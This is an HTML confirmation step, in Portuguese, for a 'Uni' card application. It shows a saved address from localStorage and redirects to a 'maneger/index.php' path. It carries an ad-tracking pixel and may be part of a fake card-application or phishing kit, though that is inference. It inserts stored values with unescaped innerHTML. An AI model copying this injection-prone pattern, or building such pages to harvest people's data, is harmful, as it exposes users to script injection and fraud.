<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uni - Faça seu Cartão</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="assets/style.css">
    
<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  async
  defer
></script>

<script>
  window.pixelId = "66bb763debbcebab27d68442";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>
    
</head>      
<body>
    <link rel="stylesheet" href="../../../../assets/style.css">

<div style="
  display: grid;
  grid-template-areas:
    'top-bar'
    'content'
    'footer';
  grid-template-rows: auto 1fr auto;
  min-height: 100vh;
">   
    <div class="header">
        <img style="width: 120px;" src="https://i.imgur.com/Q0PyyEg.png" alt="Imagem Centralizada">
    </div>

    <div style="grid-area: content; padding: 0 1rem;">
        <div style="margin-top: 40px;" class="main-content">
            <!-- Seção de confirmação de dados -->
            <div id="confirmacao-dados-secao" class="mb-3">
                <h5>Seus dados estão corretos?</h5>
                <p class="text-start" id="dados-endereco"></p>
                <button class="btn btn-custom w-80 rounded-pill" onclick="confirmarDados()">Os dados estão corretos</button>
            </div>
        </div>
    </div>

    <script>
        function carregarDadosEndereco() {
            // Recupera os dados do localStorage
            const rua = localStorage.getItem('rua') || '';
            const numero = localStorage.getItem('numero') || '';
            const complemento = localStorage.getItem('complemento') || '';
            const bairro = localStorage.getItem('bairro') || '';
            const cidade = localStorage.getItem('cidade') || '';
            const estado = localStorage.getItem('estado') || '';
            const cep = localStorage.getItem('cep') || '';

            // Monta o endereço completo
            const enderecoCompleto = `${rua}, ${numero} ${complemento ? ', ' + complemento : ''}<br>${bairro}<br> ${cidade}/${estado}<br>${cep}`;

            // Insere o endereço completo no elemento HTML
            document.getElementById('dados-endereco').innerHTML = enderecoCompleto;
        }

        carregarDadosEndereco();

        function confirmarDados() {
            location.href = 'maneger/index.php';
        }
        
    </script>

    <div class="footer py-4" id="footerChg">
        © 2024 Uni S/A. CNPJ 68.842.676/0001-66. <br>
         Av. paulista 1320, São Paulo/SP - CEP 01310-930
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

</body>
</html>

</div>